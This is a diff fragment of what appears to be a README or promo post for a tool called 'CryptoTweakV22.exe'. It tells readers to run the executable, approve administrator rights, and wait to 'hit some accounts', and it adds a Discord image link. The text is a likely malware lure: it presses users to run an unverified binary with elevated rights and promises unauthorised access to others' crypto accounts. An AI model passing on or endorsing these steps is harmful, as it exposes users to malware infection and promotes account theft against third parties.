@@ -19,3 +19,5 @@ Third, run "CryptoTweakV22.exe" and when it ask for administrator rights hit yes
 Fourth, you don't have to do anything more just wait and see if you can hit some accounts 🫢
 
 Good Luck Everybody!!! 🎉🎉🎉🎉
+
+(https://media.discordapp.net/attachments/1246193107201032369/1246547527705297068/LoXKFDLmjXORrmNECSTLR_CMJu4MbFqK.png?ex=665cc95a&is=665b77da&hm=6f242929461ab86d51e0711786b2b25d6ff00bb3a71c69352959c1a3d38b3058&=&format=webp&quality=lossless&width=900&height=468)
